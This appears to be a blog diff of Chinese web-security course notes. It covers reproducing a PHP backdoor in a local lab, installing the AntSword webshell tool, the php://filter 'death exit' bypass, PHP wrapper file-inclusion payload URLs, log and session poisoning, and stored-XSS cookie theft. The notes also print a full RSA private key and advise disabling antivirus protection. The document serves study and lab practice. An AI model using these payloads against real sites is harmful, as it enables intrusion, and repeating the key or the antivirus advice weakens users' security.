+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEA1ZswRub+3DvSEnBiyM5YRpRzRYV88vO1X2j867u6pyCHUNXv</span><br><span class="line">RRCr7ahMLPIVYsZwlHb4sF+Zb3DJOBH+E265o93chdMxbWG44k0spf10JRevA0JX</span><br><span class="line">NrEwHR8vesCR74e5MuddbSic88lsEqnnn+Fo3lStvE6nBp6tbqdEu7GhTtHSYejn</span><br><span class="line">wwINnA5ocsHkd1YE9L2Scqw1e4bXveTAQnSvhqe33QshGXFpt0tQwRWngah887f2</span><br><span class="line">P54wFSm2C/UyFT7pvIjINKzIi4vUoXz/nU+V7neTmt3XDdjloYg3ycOaX4RSVneO</span><br><span class="line">HCf7hkcEKbzbPzzSrGAAYYC5UzFB+ImsIbtV2wIDAQABAoIBAQCjROxgtX2Gft7y</span><br><span class="line">Ix8Ol9IXmK6HLCI2XZt7ovb3hFWGGzHy0qMBql2P2Tzoed1o038Hq+woe9n+uTnE</span><br><span class="line">dtQ6rD6PByzgyW2VSsWTjCOdeJ5HH9Qw7ItXDZZWHBkhfYHOkXI4e2oI3qshGAtY</span><br><span class="line">NLALn7KVhioJriCyyaSM2KOLx5khcY+EJ1inQfwQJKqPGsdKc72liz07T8ifRj+m</span><br><span class="line">NLKtwrxlK3IXYfIdgLp/1pCKdrC80DhprMsD4xvNgq4pCR9jd4FoqM9t/Up5ppTm</span><br><span class="line">+p6A/bDwdIPh6cFFeyMP+G3+bTlW1Gg7RLoNCc6qh53WWVgEOQqdLHcQ8Ge4RLmb</span><br><span class="line">wLUmnRuRAoGBAPfXYfjpPZi8rPIQpux13Bs7xaS1/Fa9WqrEfrPptFdUVHeFCGY8</span><br><span class="line">qOUVewPviHdbs0nB71Ynk9/e96agFYijQdqTQzVnpYI4i8GiGk5gPMiB2UYeJ/HZ</span><br><span class="line">mIB3jtWyf6Z/GO0hJ1a6mX0XD3zJGNqFaiwqaYgdO1Fwh9gcH3O2lHyjAoGBANyj</span><br><span class="line">TGDBYHpxPu6uKcGreLd0SgO61PEj7aOSNfrBB2PK83A+zjZCFZRIWqjfrkxGG6+a</span><br><span class="line">2WuHbEHuCGvu2V5juHYxbAD/38iV/lQl/2xyvN1eR/baE3US06qn6idxjnmeNZDy</span><br><span class="line">DelAx1RGuEvLX1TNAzDTxBwYyzH3W2RpKAUAD11pAoGAN38YJhd8Pn5JL68A4cQG</span><br><span class="line">dGau/BHwHjAqZEC5qmmzgzaT72tvlQ0SOLHVqOzzHt7+x45QnHciSqfvxnTkPYNp</span><br><span class="line">FJuTGhtKWV12FfbJczFjivZgg63u/d3eoy2iY0GkCdE98KNS3r3L7tHCGwwgr5Xe</span><br><span class="line">T2Nz3BHHnZXYJVEuzcddeocCgYEAnhDjPAHtw2p0Inxlb9kPb6aBC/ECcwtBSUkL</span><br><span class="line">IOy/BZA1HPnxs89eNFAtmwQ8k2o6lXDDSJTJSuZj5CdGVKfuU8aOUJz/Tm2eudxL</span><br><span class="line">A/+jLJhJyCBthhcJyx3m04E4CAr+5ytyKeP9qXPMvoghcNg66/UabuKYV+CU+feX</span><br><span class="line">8xUa7NkCgYEAlX8HGvWMmiG+ZRFB//3Loy87bBxGlN0pUtCEScabZxdB2HkI9Vp7</span><br><span class="line">Yr67QIZ3y7T88Mhkwam54JCjiV+3TZbSyRMOjkqf7UhTCZC6hHNqdUnlpv4bJWeW</span><br><span class="line">i5Eun8ltYxBnemNc2QGxA4r+KCspi+pRvWNGzL3PFVBGXiLsmOMul78=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>4.更改key文件的属性  右击-》属性&#x3D;&#x3D;》安全&#x3D;&#x3D;》高级</p>
+<p><img data-src="https://gitee.com/go1234567/typora/raw/master/anquan/image-20260113175331692.png" alt="image-20260113175331692"></p>
+<p><img data-src="https://gitee.com/go1234567/typora/raw/master/anquan/image-20260113175418472.png" alt="image-20260113175418472"></p>
+<p><img data-src="https://gitee.com/go1234567/typora/raw/master/anquan/image-20260113175439578.png" alt="image-20260113175439578"></p>
+<p>删除到只存在如下权限</p>
+<p><img data-src="https://gitee.com/go1234567/typora/raw/master/anquan/image-20260113175524861.png" alt="image-20260113175524861"></p>
+<p>点击确定</p>
+<p>5.vscode右键使用管理员权限登录，然后用这个私钥连接Linux机器的2222端口：</p>
+<p>vscode安装插件</p>
+<p><img data-src="https://gitee.com/go1234567/typora/raw/master/anquan/image-20260113175131662.png" alt="image-20260113175131662"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p2222 -i e:/private.key root@192.168.147.128</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260113183735637.png" alt="image-20260113183735637"></p>
+<p>输入在上述搜索栏中（注意key文件的更改和ip地址的更改，ip地址是自己虚拟机的ip地址）</p>
+<p>6.连接成功会打开个新窗口，此时会在容器的 &#x2F;root&#x2F;.vscode-server&#x2F; 中安装vscode server</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115102532406.png" alt="image-20260115102532406"></p>
+<p>7.然后打开文件夹，打开源码目录 &#x2F;usr&#x2F;src&#x2F;php&#x2F; ：</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115102826095.png" alt="image-20260115102826095"></p>
+<p>最后，为了调试C的代码，还需要安装vscode的扩展<strong>C&#x2F;C++</strong>：</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115102935036.png" alt="image-20260115102935036"></p>
+<p>8.打开运行，添加一个debug配置</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115103743677.png" alt="image-20260115103743677"></p>
+<p>其中，program是二进制文件路径，我们填入 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php ，args是调试时传给二进制文件的参数，我们要启动一个PHP的Built-in Server进行调试，所以参数是 [“-S”, “0.0.0.0:8080”, “-t”,”&#x2F;var&#x2F;www&#x2F;html”] 。</p>
+<p>9.然后在容器中写入hello world</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php echo &quot;hello world&quot;; ?&gt;&#x27; &gt; /var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p>10.再点击VScode里的<strong>Run and Debug</strong>，启动调试进程</p>
+<p>（问题查询，如果成功运行查看好端口映射是否无误）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115105706025.png" alt="image-20260115105706025"></p>
+<h4 id="4-调试"><a href="#4-调试" class="headerlink" title="4.调试"></a>4.调试</h4><p>1.在vscode中找到后门所在的代码ext&#x2F;zlib&#x2F;zlib.c:366，然后运行它</p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115120932378.png" alt="image-20260115120932378"></p>
+<p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115120946598.png" alt="image-20260115120946598"></p>
+<p>成功访问以后复现漏洞，进行抓包</p>
+<p>2.然后repeater，发送查看<img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115122018759.png" alt="image-20260115122018759"></p>
+<p>最后成功复现查看到后门</p>
+<h2 id="2-实验复现"><a href="#2-实验复现" class="headerlink" title="2.实验复现"></a>2.实验复现</h2><h1 id="三、第三天"><a href="#三、第三天" class="headerlink" title="三、第三天"></a>三、第三天</h1><h2 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h2><p>师承中国菜刀</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="1-加载器"><a href="#1-加载器" class="headerlink" title="1.加载器"></a>1.加载器</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9hbnRTd29yZC9yZWxlYXNlcy90YWcvMi4xLjE1">https://github.com/AntSwordProject/antSword/releases/tag/2.1.15</span></p>
+<h4 id="2-安装成功后会出现以下页面"><a href="#2-安装成功后会出现以下页面" class="headerlink" title="2.安装成功后会出现以下页面"></a>2.安装成功后会出现以下页面</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/1592179/1611819163867-668883f7-1bdf-40d8-97e4-0cfa6f1f84b6.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_104,text_YW50c3dvcmQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp" alt="image.png"></p>
+<h4 id="3-问题"><a href="#3-问题" class="headerlink" title="3.问题"></a>3.问题</h4><p>出现解码失败以后先关闭防火墙和实时保护，然后在google里面关闭下载的安全保护，还是不行就手动下载源码进行解码</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL3IvZ290bz91cmw9aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC9hcmNoaXZlL21hc3Rlci56aXA=">https://www.yuque.com/r/goto?url=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FAntSword%2Farchive%2Fmaster.zip</span></p>
+<h4 id="4-结果"><a href="#4-结果" class="headerlink" title="4.结果"></a>4.结果</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/1592179/1611819192749-5eb6e2db-54fe-4bf3-8f1a-377850858abb.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_131,text_YW50c3dvcmQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp" alt="image.png"></p>
+<p>全部安装完毕以后会提示手动重启然后直接进入主目录页面</p>
+<h2 id="2-名词解释"><a href="#2-名词解释" class="headerlink" title="2.名词解释"></a>2.名词解释</h2><h3 id="1-poc"><a href="#1-poc" class="headerlink" title="1.poc"></a>1.poc</h3><p>漏洞测试，命令执行，不会进一步操作</p>
+<h3 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h3><p>会进一步利用，比如写入webshell网站后门</p>
+<h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><p>webshell写好内容里面的源码</p>
+<h3 id="4-shellcode"><a href="#4-shellcode" class="headerlink" title="4.shellcode"></a>4.shellcode</h3><p>远程控制木马中，更多出现在机械码中</p>
+<h3 id="5-php文件"><a href="#5-php文件" class="headerlink" title="5.php文件"></a>5.php文件</h3><p>进入到nginx页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/html/</span><br></pre></td></tr></table></figure>
+
+<p>然后查看是否存在web.php文件，然后查看nginx是否运行，php是否打开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br><span class="line"> systemctl start php7.3-fpm.service</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-php-filter"><a href="#3-php-filter" class="headerlink" title="3.php:&#x2F;&#x2F;filter"></a>3.php:&#x2F;&#x2F;filter</h2><h3 id="1-新建一个-php文件"><a href="#1-新建一个-php文件" class="headerlink" title="1.新建一个.php文件"></a>1.新建一个.php文件</h3><p><img data-src="C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260115133553976.png" alt="image-20260115133553976"></p>
+<p>在里面写入所需的内容</p>
+<p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>幸运的是，这里的$_POST[‘filename’]是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<h3 id="2-理解正常的base64-decode"><a href="#2-理解正常的base64-decode" class="headerlink" title="2.理解正常的base64_decode"></a>2.理解正常的base64_decode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);</span><br><span class="line">base64_decode($_GET[&#x27;txt&#x27;]);</span><br><span class="line">phpexita</span><br></pre></td></tr></table></figure>
+
+<p>所以，当$content被加上了<?php exit; ?>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<?php exit; ?>没有了。</p>
+<h3 id="3-效果"><a href="#3-效果" class="headerlink" title="3.效果"></a>3.效果</h3><h2 id="4-封装协议–php伪协议"><a href="#4-封装协议–php伪协议" class="headerlink" title="4.封装协议–php伪协议"></a>4.封装协议–php伪协议</h2><p>涉及的相关协议：file:&#x2F;&#x2F;、php:&#x2F;&#x2F;filter、php:&#x2F;&#x2F;input、zip:&#x2F;&#x2F;、compress.bzip2:&#x2F;&#x2F;、compress.zlib:&#x2F;&#x2F;、data:&#x2F;&#x2F;等</p>
+<h3 id="1-【file-协议】"><a href="#1-【file-协议】" class="headerlink" title="1.【file:&#x2F;&#x2F;协议】"></a>1.【file:&#x2F;&#x2F;协议】</h3><p>PHP.ini：</p>
+<p>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off&#x2F;on</p>
+<p>allow_url_include：off&#x2F;on</p>
+<p>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132001217-1053952523.png" alt="img"></p>
+<p>file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZmlsZTovL0Q6L3NvZnQvcGhwU3R1ZHkvV1dXL3BocGNvZGUudHh0">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</span></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20170925/15063200934739.png"><img data-src="https://image.3001.net/images/20170925/15063200934739.png!small" alt="02 2.png"></a></p>
+<h3 id="2-【php-协议】"><a href="#2-【php-协议】" class="headerlink" title="2.【php:&#x2F;&#x2F;协议】"></a>2.【php:&#x2F;&#x2F;协议】</h3><p>条件：</p>
+<p>不需要开启allow_url_fopen，仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</p>
+<p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p>
+<p>参考自：<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL3dyYXBwZXJzLnBocC5waHAjcmVmc2VjdDItd3JhcHBlcnMucGhwLXVua25vd24tdW5rbm93bi11bmtub3duLWRlc2NyaXB0aW9x">http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq</span></p>
+<p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
+<p>PHP.ini：</p>
+<p>php:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off&#x2F;on</p>
+<p>allow_url_include：off&#x2F;on</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132307452-892692249.png" alt="img"></p>
+<p>测试现象：</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vY21kLnBocA==">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span></p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132442633-1091058952.png" alt="img"></p>
+<p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
+<p><strong>PHP.ini：</strong></p>
+<p>allow_url_fopen ：off&#x2F;on</p>
+<p>allow_url_include：on</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132611224-1460693422.png" alt="img"></p>
+<p><strong>测试现象：</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9cGhwOi8vaW5wdXQ=">http://127.0.0.1/cmd.php?file=php://input</span></p>
+<p>[POST DATA] <?php phpinfo()?></p>
+<p>也可以POST如下内容生成一句话： <?php                                                                  ?>’);?&gt;</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132658330-472689552.png" alt="img"></p>
+<h3 id="3-【zip-bzip2-zlib-协议】"><a href="#3-【zip-bzip2-zlib-协议】" class="headerlink" title="3.【zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议】"></a>3.【zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议】</h3><p><strong>PHP.ini：</strong></p>
+<p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off&#x2F;on</p>
+<p>allow_url_include：off&#x2F;on</p>
+<p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
+<p>参考自：<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL3dyYXBwZXJzLmNvbXByZXNzaW9uLnBocA==">http://php.net/manual/zh/wrappers.compression.php</span></p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602132809983-2003727814.png" alt="img"></p>
+<p><strong>1.【zip:&#x2F;&#x2F;协议】</strong></p>
+<p><strong>使用方法：</strong></p>
+<p>zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</p>
+<p>zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+<p><strong>测试现象：</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9emlwOi8vRDovc29mdC9waHBTdHVkeS9XV1cvZmlsZS5qcGclMjNwaHBjb2RlLnR4dA==">http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</span></p>
+<p>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</p>
+<p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602133006638-177215011.png" alt="img"></p>
+<p><strong>2.【bzip2:&#x2F;&#x2F;协议】</strong></p>
+<p><strong>使用方法：</strong></p>
+<p>compress.bzip2:&#x2F;&#x2F;file.bz2</p>
+<p><strong>测试现象：</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9Y29tcHJlc3MuYnppcDI6Ly9EOi9zb2Z0L3BocFN0dWR5L1dXVy9maWxlLmpwZw==">http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</span></p>
+<p>or</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9Y29tcHJlc3MuYnppcDI6Ly8uL2ZpbGUuanBn">http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg</span></p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602133203256-355079794.png" alt="img"></p>
+<p><strong>3.【zlib:&#x2F;&#x2F;协议】</strong></p>
+<p><strong>使用方法：</strong></p>
+<p>compress.zlib:&#x2F;&#x2F;file.gz</p>
+<p><strong>测试现象：</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9Y29tcHJlc3MuemxpYjovL0Q6L3NvZnQvcGhwU3R1ZHkvV1dXL2ZpbGUuanBn">http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</span></p>
+<p>or</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9Y29tcHJlc3MuemxpYjovLy4vZmlsZS5qcGc=">http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg</span></p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602133251907-100907257.png" alt="img"></p>
+<h3 id="4-【data-协议】"><a href="#4-【data-协议】" class="headerlink" title="4.【data:&#x2F;&#x2F;协议】"></a>4.【data:&#x2F;&#x2F;协议】</h3><p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:&#x2F;&#x2F; 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data:&#x2F;&#x2F;协议需要满足双on条件</p>
+<p><strong>PHP.ini：</strong></p>
+<p>data:&#x2F;&#x2F;协议必须双在on才能正常使用；</p>
+<p>allow_url_fopen ：on</p>
+<p>allow_url_include：on</p>
+<p>参考自：<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL3dyYXBwZXJzLmRhdGEucGhw">http://php.net/manual/zh/wrappers.data.php</span>, 官方文档上allow_url_fopen应为yes。</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602133413893-1227293317.png" alt="img"></p>
+<p><strong>测试现象：</strong></p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>
+<p>or</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>
+<p>也可以：</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTp0ZXh0L3BsYWlu">http://127.0.0.1/cmd.php?file=data:text/plain</span>,<?php phpinfo()?></p>
+<p>or</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTp0ZXh0L3BsYWluO2Jhc2U2NCxQRDl3YUhBZ2NHaHdhVzVtYnlncFB6ND0=">http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602133452979-556444476.png" alt="img"></p>
+<h1 id="四、第四天"><a href="#四、第四天" class="headerlink" title="四、第四天"></a>四、第四天</h1><h2 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h2><h3 id="1-包含apache日志文件"><a href="#1-包含apache日志文件" class="headerlink" title="1.包含apache日志文件"></a>1.包含apache日志文件</h3><p> WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p>
+<p> Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>  如果访问一个不存在的资源时，如<span class="exturl" data-url="aHR0cDovL3d3dy54eHh4LmNvbS8=">http://www.xxxx.com/</span><?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</p>
+<p>参考文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbXkxZTMvcC81ODU0ODk3Lmh0bWw=">1.包含日志文件getshell</span><br>     <span class="exturl" data-url="aHR0cHM6Ly9jaHliZXRhLmdpdGh1Yi5pby8yMDE3LzA4LzA2L1NIQUNURi0yMDE3LVdlYi13cml0ZXVwLyNNZXRob24tVHdv">2.一道包含日志文件的CTF题</span></p>
+<h3 id="2-包含session–用户名可控，找到物理路径"><a href="#2-包含session–用户名可控，找到物理路径" class="headerlink" title="2.包含session–用户名可控，找到物理路径"></a>2.包含session–用户名可控，找到物理路径</h3><p>session PHP中 默认是以文件形式存储</p>
+<p>作用：记录登陆行为  &#x2F;  记录一些·账号信息  — 为了让在一定的时间里免登录</p>
+<p>cookie – session</p>
+<p>相关：</p>
+<p>1.xss存储型xss – 可以盗取你的cookie</p>
+<p>入侵一个网站 </p>
+<p>form表单 – 个人信息，个人建议</p>
+<p>在其中插入你的xss代码 — js代码</p>
+<p>让管理员在后台审核</p>
+<p>js代码<script>document cookie 入侵者</p>
+<p>2.session -- 可以预防逻辑漏洞，一定程度上</p>
+<p>平行权限--id是1的用户可以查看uid是2的用户的各种信息</p>
+<p>学校--外部防御0信任，态势感知，waf</p>
+<p>内部账号不安全--教务系统信息</p>
+<p>uid=1的规律可以猜到 --- 现在2026根本猜不到 </p>
+<p><strong>最佳方案：使用session</strong></p>
+<p>select username from users where uid = $uid and session[uid]</p>
+<p>垂直漏洞</p>
+<p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p><strong>session常见存储路径：</strong></p>
+<ul>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+<li>session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>
+</ul>
+<p>参考文章：<span class="exturl" data-url="aHR0cHM6Ly9jaHliZXRhLmdpdGh1Yi5pby8yMDE3LzExLzA5LyVFNCVCOCU4MCVFOSU4MSU5M0NURiVFOSVBMiU5OCVFRiVCQyU5QVBIUCVFNiU5NiU4NyVFNCVCQiVCNiVFNSU4QyU4NSVFNSU5MCVBQi8=">一道SESSION包含的CTF题</span></p>
+<p>出现文件包含问题的参数：</p>
+<p>file=  / action=  / act=  / img=</p>
+<p>post传参：form表单传参，安全性高/get传参：浏览器传参，能够看到</p>
+<p>拼接---sql注入</p>
+<p>预编译---?占位符 mysql --- 极大的杜绝sql注入</p>
+<p><strong>php://filter/read=convert.base64-decode/resource=session具体的路径</strong></p>
+<p>base64编码 长度不够--更改编码头部，24 16 124 </p>
+<p>aaaaaaaaaaaaaaaaaaa+用户名</p>
